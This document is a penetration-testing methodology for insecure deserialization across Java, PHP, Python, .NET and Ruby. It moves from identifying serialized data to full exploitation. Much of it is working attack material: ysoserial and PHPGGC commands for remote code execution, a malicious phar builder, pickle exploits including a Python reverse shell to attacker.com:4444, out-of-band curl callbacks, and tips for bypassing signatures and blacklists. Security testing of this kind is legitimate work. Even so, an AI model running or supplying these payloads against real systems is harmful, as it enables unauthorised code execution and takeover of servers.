# Insecure Deserialization Testing Methodology

## Quick Reference

**Detection:**
- Look for serialized data in parameters/cookies
- Common formats: Base64, hex, binary

**Common Signatures:**
- Java: `rO0AB...` (Base64), `AC ED 00 05` (hex)
- PHP: `O:4:"User":2:{...}`
- .NET: `AAEAAAD...` (Base64)
- Python: `gASV...` (Base64 pickle)

---

## Identifying Serialized Data

### Java

**Base64:**
```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...
```

**Hex:**
```
AC ED 00 05 (magic bytes)
```

**Common locations:**
- ViewState
- Cookies
- Hidden form fields
- API parameters

### PHP

**Format:**
```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

**Breakdown:**
- `O:4` = Object with 4-char class name
- `s:4` = String of 4 chars
- `i:1` = Integer 1
- `a:2` = Array of 2 elements
- `b:1` = Boolean true

### Python (Pickle)

**Base64:**
```
gASVIgAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH0=
```

### .NET

**ViewState (Base64):**
```
/wEPDwUJNzg0MDMy...
```

**BinaryFormatter:**
```
AAEAAAD/////...
```

### Ruby (Marshal)

**Format:**
```
\x04\x08o:\x0cAccount...
```

---

## Java Deserialization

### Gadget Chains

Common vulnerable libraries:
- Apache Commons Collections
- Spring Framework
- Hibernate
- JBoss
- WebLogic

### ysoserial Payloads

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' > payload.bin

# Base64 encode
base64 payload.bin > payload.b64
```

**Common gadgets:**
```
CommonsCollections1-7
CommonsBeanutils1
Spring1-2
Hibernate1-2
JRMPClient
URLDNS (detection only)
```

### URLDNS Detection

Safe gadget that only makes DNS request:

```bash
java -jar ysoserial.jar URLDNS 'http://detect.attacker.com' | base64
```

If DNS callback received, deserialization confirmed.

### Blind Exploitation

**Time-based:**
```bash
# Use gadget with sleep
java -jar ysoserial.jar CommonsCollections2 'sleep 10'
```

**Out-of-band:**
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com'
java -jar ysoserial.jar CommonsCollections1 'nslookup attacker.com'
```

---

## PHP Deserialization

### Object Injection

**Vulnerable code:**
```php
$data = unserialize($_GET['data']);
```

**Exploit via magic methods:**
- `__wakeup()` - Called on unserialize
- `__destruct()` - Called when object destroyed
- `__toString()` - Called when object used as string

### POP Chain Construction

1. Find class with exploitable magic method
2. Chain method calls to reach dangerous sink
3. Craft serialized object

**Example payload:**
```php
O:4:"User":1:{s:4:"file";s:11:"/etc/passwd";}
```

### PHPGGC Tool

```bash
# List available chains
phpggc -l

# Generate payload
phpggc Laravel/RCE1 system id

# Base64 encode
phpggc Laravel/RCE1 system id -b
```

**Common chains:**
```
Laravel/RCE1-9
Symfony/RCE1-4
WordPress/RCE1-2
Guzzle/RCE1
Monolog/RCE1-7
```

### Phar Deserialization

Phar files can trigger deserialization via file operations:

```php
// These trigger deserialization on phar
file_exists('phar://malicious.phar')
file_get_contents('phar://malicious.phar')
include('phar://malicious.phar')
```

**Create malicious phar:**
```php
<?php
$phar = new Phar('malicious.phar');
$phar->setStub('<?php __HALT_COMPILER();');
$payload = new VulnerableClass();
$payload->command = 'id';
$phar->setMetadata($payload);
?>
```

---

## Python Pickle Deserialization

### Basic Exploitation

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

### Advanced Payloads

**Reverse shell:**
```python
class Exploit:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen,
                (['python', '-c',
                  'import socket,subprocess,os;s=socket.socket();'
                  's.connect(("attacker.com",4444));'
                  'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                  'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'],))
```

### Detection

Send payload that causes time delay or DNS lookup:
```python
class Detect:
    def __reduce__(self):
        import time
        return (time.sleep, (10,))
```

---

## .NET Deserialization

### ViewState

If `enableViewStateMac=false` or MAC key known:

```bash
# Generate payload with ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping attacker.com"
```

### BinaryFormatter

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
```

### Common Gadgets

```
TypeConfuseDelegate
TextFormattingRunProperties
PSObject
ActivitySurrogateSelector
```

---

## Ruby Marshal Deserialization

### Exploitation

```ruby
# Gadget chains vary by Ruby version and installed gems
# Check for universal deserialize gadget chain
```

**Common approach:**
- Find class with dangerous `marshal_load`
- Chain to code execution

---

## Finding Deserialization Vulnerabilities

### Common Locations

1. **Cookies** - Session data, preferences
2. **Hidden form fields** - ViewState, state tokens
3. **API parameters** - Base64 encoded data
4. **File uploads** - Processed file formats
5. **Message queues** - Serialized messages
6. **Cache systems** - Cached objects

### Identification Steps

1. **Find serialized data:**
   - Look for Base64 in parameters
   - Check cookies for serialized objects
   - Inspect hidden fields

2. **Identify format:**
   - Java: `rO0AB` prefix
   - PHP: `O:`, `a:`, `s:` patterns
   - Python: `gASV` prefix
   - .NET: `AAEAAAD` prefix

3. **Test for vulnerability:**
   - Modify serialized data
   - Use DNS/time-based detection payload
   - Check for error messages

---

## Bypass Techniques

### Type Confusion

Change object type while keeping structure:
```php
O:8:"AdminUser":1:{...}
```

### Property Injection

Add unexpected properties:
```php
O:4:"User":2:{s:4:"name";s:4:"test";s:7:"isAdmin";b:1;}
```

### Gadget Chain Variants

If one gadget blocked, try alternatives:
- Different library versions
- Alternative chains
- Custom chains

---

## Prevention Bypass

### Signed Serialization

If signature weak or key known:
- Brute force key
- Look for key disclosure
- Signature bypass via parsing differentials

### Blacklist Bypass

If certain classes blocked:
- Use equivalent classes
- Use different gadget chain
- Subclass exploitation

---

## Verification Checklist

1. **Identify serialized data:**
   - [ ] Scan parameters/cookies for serialization signatures
   - [ ] Identify serialization format

2. **Test for vulnerability:**
   - [ ] DNS callback payload (URLDNS)
   - [ ] Time-based detection
   - [ ] Error-based detection

3. **Exploit:**
   - [ ] Generate appropriate gadget chain
   - [ ] Test command execution
   - [ ] Confirm RCE

4. **Document evidence:**
   - [ ] Callback/timing proof
   - [ ] Command output
   - [ ] Working payload
